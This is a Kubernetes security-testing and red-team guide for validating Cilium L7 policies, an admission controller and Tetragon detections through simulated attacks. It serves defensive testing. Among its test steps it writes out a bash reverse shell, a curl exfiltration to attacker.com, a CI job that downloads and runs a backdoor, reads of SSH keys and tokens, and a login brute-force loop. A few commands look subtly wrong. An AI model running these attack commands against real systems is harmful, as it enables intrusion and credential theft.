# 🎯 Security Testing & Red Team Exercise Guide

## Overview

This guide provides comprehensive testing procedures to validate Phase 2 security implementations (L7 policies, Admission Controller, Tetragon). These are actual attack scenarios you can safely run in your cluster.

---

## 🧪 Testing Environment Setup

### Prerequisites

```bash
# Install testing tools
brew install netshoot  # Network debugging
brew install kubectl-debug  # Debug containers
brew install curl jq

# Create test namespace
kubectl create namespace security-test

# Label for testing
kubectl label namespace security-test testing=true
```

---

## 1️⃣ Admission Controller Testing

### Test 1: Valid NetworkPolicy (Should SUCCEED)

```bash
cat <<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: test-valid-policy
  namespace: security-test
spec:
  endpointSelector:
    matchLabels:
      app: test-app
  ingress:
    - fromEndpoints:
        - matchLabels:
            role: frontend
      toPorts:
        - ports:
            - port: "8080"
              protocol: TCP
EOF

# Expected: Policy created successfully
kubectl get cnp -n security-test test-valid-policy
```

### Test 2: Invalid NetworkPolicy (Should FAIL)

```bash
cat <<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: test-invalid-policy
  namespace: security-test
spec:
  endpointSelector: {}  # ❌ Empty selector (invalid)
  ingress:
    - fromEndpoints: []
EOF

# Expected: Error from admission controller
# "endpointSelector must match at least one label"
```

### Test 3: Malformed YAML (Should FAIL)

```bash
cat <<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: test-malformed
  namespace: security-test
spec:
  endpointSelector:
    matchLabels:
      app: test
  ingress:
    - fromEndpoints:
        - matchLabels: "invalid-syntax"  # ❌ Invalid YAML
EOF

# Expected: YAML parsing error
```

### Verification

```bash
# Check admission controller logs
kubectl logs -n kube-system deployment/cilium-operator | grep -i webhook

# Verify webhook configuration
kubectl get validatingwebhookconfigurations | grep cilium
```

---

## 2️⃣ L7 Policy Testing

### Setup Test Environment

```bash
# Deploy test backend
kubectl run backend --image=nginx --labels=app=backend -n security-test
kubectl expose pod backend --port=80 -n security-test

# Deploy test frontend
kubectl run frontend --image=curlimages/curl --labels=role=frontend -n security-test -- sleep infinity
```

### Test 1: HTTP Method Restriction

**Deploy L7 Policy:**

```bash
cat <<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: test-http-method-restriction
  namespace: security-test
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
    - fromEndpoints:
        - matchLabels:
            role: frontend
      toPorts:
        - ports:
            - port: "80"
              protocol: TCP
          rules:
            http:
              - method: "GET"  # Only allow GET
              - method: "HEAD"
EOF
```

**Test Allowed Method (GET):**

```bash
kubectl exec -n security-test frontend -- curl -X GET http://backend

# Expected: 200 OK
```

**Test Blocked Method (DELETE):**

```bash
kubectl exec -n security-test frontend -- curl -X DELETE http://backend

# Expected: 403 Forbidden (blocked by L7 policy)
```

**Verify in Hubble:**

```bash
hubble observe --namespace security-test --verdict DENIED --protocol http

# Expected output:
# security-test/frontend -> security-test/backend:80 HTTP DELETE DENIED (L7 policy)
```

### Test 2: Path-Based Access Control

**Deploy Path-Based Policy:**

```bash
cat <<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: test-path-based-policy
  namespace: security-test
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
    # Regular users - public paths only
    - fromEndpoints:
        - matchLabels:
            role: frontend
      toPorts:
        - ports:
            - port: "80"
              protocol: TCP
          rules:
            http:
              - method: "GET"
                path: "/public/.*"  # Only /public/* allowed
    # Admin users - full access
    - fromEndpoints:
        - matchLabels:
            role: admin
      toPorts:
        - ports:
            - port: "80"
              protocol: TCP
          rules:
            http:
              - method: ".*"
                path: "/.*"  # All paths
EOF
```

**Test Allowed Path:**

```bash
kubectl exec -n security-test frontend -- curl http://backend/public/index.html

# Expected: 200 OK
```

**Test Blocked Path (admin area):**

```bash
kubectl exec -n security-test frontend -- curl http://backend/admin/users

# Expected: 403 Forbidden
```

### Test 3: FQDN-Based Egress

**Deploy FQDN Policy:**

```bash
cat <<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: test-fqdn-egress
  namespace: security-test
spec:
  endpointSelector:
    matchLabels:
      role: frontend
  egress:
    - toFQDNs:
        - matchName: "api.github.com"
        - matchPattern: "*.github.com"
      toPorts:
        - ports:
            - port: "443"
              protocol: TCP
          rules:
            http:
              - method: "GET"
EOF
```

**Test Allowed Domain:**

```bash
kubectl exec -n security-test frontend -- curl https://api.github.com

# Expected: 200 OK
```

**Test Blocked Domain:**

```bash
kubectl exec -n security-test frontend -- curl https://example.com

# Expected: Connection timeout or DNS resolution failure
```

### Performance Testing

**Measure Latency Impact:**

```bash
# Before L7 policy
kubectl run perf-test --image=fortio/fortio -n security-test -- \
  load -c 10 -qps 0 -t 30s http://backend

# Deploy L7 policy, then test again
kubectl run perf-test --image=fortio/fortio -n security-test -- \
  load -c 10 -qps 0 -t 30s http://backend

# Compare p50, p99 latency
# Target: <10ms increase
```

---

## 3️⃣ Tetragon Runtime Security Testing

### Setup Attack Simulation Environment

```bash
# Deploy vulnerable test pod
kubectl run attack-sim --image=nicolaka/netshoot --labels=app=attack-sim -n security-test -- sleep infinity
```

### Test 1: Reverse Shell Detection

**Attempt Reverse Shell (WILL BE BLOCKED):**

```bash
# Set up listener on your machine (for testing only!)
nc -lvnp 4444 &

# Attempt reverse shell from pod
kubectl exec -n security-test attack-sim -- bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"

# Expected: Process killed by Tetragon
# Error: command terminated with exit code 137 (SIGKILL)
```

**Verify Detection:**

```bash
# Check Tetragon logs
kubectl logs -n tetragon-system daemonset/tetragon --since=1m | \
  jq 'select(.policy_name == "detect-reverse-shell")'

# Expected output:
# {
#   "process_exec": {
#     "process": {
#       "binary": "/bin/bash",
#       "arguments": "-c bash -i ..."
#     }
#   },
#   "policy_name": "detect-reverse-shell",
#   "action": "Sigkill"
# }
```

### Test 2: Container Breakout Attempt

**Attempt to Access Host Filesystem:**

```bash
kubectl exec -n security-test attack-sim -- ls /host/etc/

# Expected: Process killed, command fails
```

**Attempt to Access Container Runtime Socket:**

```bash
kubectl exec -n security-test attack-sim -- ls /var/run/docker.sock

# Expected: Process killed
```

**Verify Detection:**

```bash
kubectl logs -n tetragon-system daemonset/tetragon --since=1m | \
  jq 'select(.policy_name == "detect-container-breakout")'
```

### Test 3: Cryptocurrency Miner Simulation

**Simulate Miner Download:**

```bash
# Create fake miner binary
kubectl exec -n security-test attack-sim -- sh -c "echo '#!/bin/bash' > /tmp/xmrig && chmod +x /tmp/xmrig"

# Attempt to execute
kubectl exec -n security-test attack-sim -- /tmp/xmrig

# Expected: Process killed by Tetragon
```

**Simulate Mining Pool Connection:**

```bash
kubectl exec -n security-test attack-sim -- sh -c "curl https://pool.supportxmr.com:443"

# Expected: Blocked if Tetragon detects stratum protocol
```

**Verify Detection:**

```bash
kubectl logs -n tetragon-system daemonset/tetragon --since=1m | \
  jq 'select(.policy_name == "detect-cryptocurrency-miner")'
```

### Test 4: Credential Harvesting

**Attempt SSH Key Access:**

```bash
kubectl exec -n security-test attack-sim -- cat /root/.ssh/id_rsa

# Expected: Process killed
```

**Attempt Kubernetes Config Access:**

```bash
kubectl exec -n security-test attack-sim -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Expected: Logged (this is legitimate for pods, but monitored)
```

**Verify Detection:**

```bash
kubectl logs -n tetragon-system daemonset/tetragon --since=1m | \
  jq 'select(.policy_name == "detect-credential-access")'
```

---

## 4️⃣ Application-Specific Testing

### Downloads Namespace: qBittorrent Attack

**Deploy Test Pod in Downloads Namespace:**

```bash
kubectl run qbit-attack --image=nicolaka/netshoot --labels=app.kubernetes.io/name=qbittorrent -n downloads -- sleep infinity
```

**Test Shell Execution (SHOULD BE BLOCKED):**

```bash
kubectl exec -n downloads qbit-attack -- /bin/bash

# Expected: Process killed by Tetragon
# Downloads namespace policy: qbittorrent-security
```

**Verify:**

```bash
kubectl logs -n tetragon-system daemonset/tetragon --since=1m | \
  jq 'select(.policy_name == "qbittorrent-security")'
```

### Databases Namespace: PostgreSQL Attack

**Deploy Test Pod:**

```bash
kubectl run db-attack --image=postgres:15 --labels=cnpg.io/cluster=postgres -n databases -- sleep infinity
```

**Test Shell Spawning from Database (CRITICAL - SHOULD BE BLOCKED):**

```bash
kubectl exec -n databases db-attack -- /bin/bash

# Expected: Process killed immediately
# Policy: postgres-no-shells
```

**Verify Critical Alert:**

```bash
kubectl logs -n tetragon-system daemonset/tetragon --since=1m | \
  jq 'select(.policy_name == "postgres-no-shells" and .action == "Sigkill")'
```

### Security Namespace: Keycloak Admin Protection

**Test Admin Endpoint Access (No Auth):**

```bash
kubectl run unauthorized --image=curlimages/curl -n security-test -- sleep infinity

kubectl exec -n security-test unauthorized -- \
  curl -X GET http://keycloak.security:8080/admin/master/console/

# Expected: 403 Forbidden (L7 policy blocks /admin/* without auth header)
```

**Verify L7 Policy Enforcement:**

```bash
hubble observe --namespace security --verdict DENIED --protocol http | \
  grep "/admin/"
```

---

## 5️⃣ Red Team Attack Scenarios

### Scenario 1: Multi-Stage Attack on Media Stack

**Step 1: Initial Compromise (qBittorrent Exploit)**

```bash
# Simulate exploit by exec into qBittorrent pod
kubectl exec -n downloads qbittorrent-pod -- /bin/sh

# Expected: Blocked by Tetragon (qbittorrent-security policy)
```

**Step 2: Lateral Movement Attempt**

```bash
# From compromised pod, try to access database
kubectl exec -n downloads compromised-pod -- \
  psql -h postgres.databases -U postgres

# Expected: Blocked by NetworkPolicy (L3/L4) or L7 policy
```

**Step 3: Data Exfiltration Attempt**

```bash
# Try to POST data to external server
kubectl exec -n downloads compromised-pod -- \
  curl -X POST -d @/data/sensitive.txt https://attacker.com

# Expected: Blocked by L7 policy (only GET allowed) or FQDN policy
```

### Scenario 2: Supply Chain Attack via GitLab CI

**Step 1: Malicious Pipeline**

Create malicious `.gitlab-ci.yml`:

```yaml
malicious_job:
  script:
    - curl -O https://attacker.com/backdoor.sh
    - chmod +x backdoor.sh
    - ./backdoor.sh
```

**Expected Detections:**
- Tetragon: `gitlab-runner-security` policy detects suspicious download
- L7 Policy: FQDN policy blocks connection to attacker.com

**Step 2: Container Registry Poisoning**

```bash
# Attempt to push malicious image to Harbor
docker tag malicious-image harbor.selfhosted/library/backdoor:latest
docker push harbor.selfhosted/library/backdoor:latest

# Expected:
# - L7 policy requires authentication (Bearer token)
# - Tetragon logs all pushes for audit
# - Harbor Trivy scans detect malicious content
```

### Scenario 3: Authentication Bypass Attack

**Step 1: Brute Force Keycloak**

```bash
# Automated login attempts
for i in {1..100}; do
  curl -X POST http://keycloak.security:8080/realms/master/protocol/openid-connect/token \
    -d "username=admin&password=attempt$i"
done

# Expected:
# - L7 rate limiting (if configured)
# - Alert on high authentication failure rate
```

**Step 2: Admin Endpoint Exploitation**

```bash
# Try to access admin API without proper auth
curl -X GET http://keycloak.security:8080/admin/master/console/

# Expected: Blocked by L7 policy (requires auth header)
```

---

## 6️⃣ Validation & Metrics

### Security Coverage Metrics

```bash
# 1. NetworkPolicy Coverage
kubectl get networkpolicies --all-namespaces | wc -l

# 2. L7 Policy Coverage
kubectl get ciliumnetworkpolicies --all-namespaces | wc -l

# 3. Tetragon Policy Coverage
kubectl get tracingpolicies --all-namespaces | wc -l

# 4. Pods with Policies
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"' | \
  while read pod; do
    kubectl get cnp -n $(echo $pod | cut -d/ -f1) -o json | \
      jq --arg pod "$(echo $pod | cut -d/ -f2)" '.items[] | select(.spec.endpointSelector.matchLabels | to_entries[] | .value == $pod)'
  done | wc -l
```

### Detection Metrics

```bash
# Tetragon events in last 24 hours
kubectl logs -n tetragon-system daemonset/tetragon --since=24h | \
  jq -r '.policy_name' | sort | uniq -c

# L7 policy denials
hubble observe --since=24h --verdict DENIED --protocol http | wc -l

# Admission controller rejections
kubectl logs -n kube-system deployment/cilium-operator --since=24h | \
  grep -i "policy validation failed" | wc -l
```

### False Positive Analysis

```bash
# Tetragon false positives
kubectl logs -n tetragon-system daemonset/tetragon --since=24h | \
  jq 'select(.action == "Sigkill")' | \
  jq -r '.process_exec.process.binary' | sort | uniq -c | sort -rn

# Review and tune policies based on legitimate processes being blocked
```

---

## 🎯 Success Criteria

Phase 2 testing is complete when:

### Admission Controller
- ✅ All malformed policies rejected (100% detection)
- ✅ Valid policies deployed successfully (0 false positives)
- ✅ Validation latency <100ms

### L7 Policies
- ✅ HTTP method restrictions enforced (test with curl)
- ✅ Path-based policies working (admin endpoints protected)
- ✅ FQDN policies blocking unauthorized domains
- ✅ Latency increase <10ms at p99
- ✅ Hubble showing L7 flow details

### Tetragon
- ✅ All test attacks detected (100% detection rate)
- ✅ Reverse shells blocked (critical)
- ✅ Container breakout attempts blocked (critical)
- ✅ Crypto miners detected and killed
- ✅ False positive rate <1%
- ✅ Alerts generated within 5 seconds

### Overall
- ✅ Red team scenarios detected
- ✅ Multi-stage attacks stopped at multiple points
- ✅ No operational disruptions
- ✅ Security dashboards showing data
- ✅ Alerts firing correctly

---

## 🚨 Incident Response Testing

### Test Alert Pipeline

1. Trigger Tetragon alert (reverse shell attempt)
2. Verify alert reaches Victoria Metrics
3. Check Grafana dashboard updates
4. Verify external alerting (PagerDuty, Slack, etc.)
5. Time to detection: <5 seconds
6. Time to alert: <30 seconds

---

## 📊 Reporting

After testing, generate report:

```bash
# Test results summary
cat > security-testing-report.md <<EOF
# Security Testing Report

## Date: $(date)
## Tester: [Your Name]

### Admission Controller
- Valid policies tested: X
- Invalid policies rejected: X
- False positives: 0

### L7 Policies
- HTTP method tests: PASS
- Path-based tests: PASS
- FQDN tests: PASS
- Performance impact: X ms (acceptable)

### Tetragon
- Attacks detected: X/X (100%)
- False positives: X (<1%)
- Response time: X seconds

### Red Team Exercises
- Scenario 1: DETECTED & BLOCKED
- Scenario 2: DETECTED & BLOCKED
- Scenario 3: DETECTED & BLOCKED

## Conclusion
Phase 2 security implementation is **READY FOR PRODUCTION**.
EOF
```

---

## 🧹 Cleanup

```bash
# Remove test namespace
kubectl delete namespace security-test

# Remove test policies
kubectl delete cnp --all -n security-test

# Stop Tetragon event logging (if needed)
kubectl scale daemonset/tetragon -n tetragon-system --replicas=1
```

---

**Ready to validate your cluster security!** 🛡️
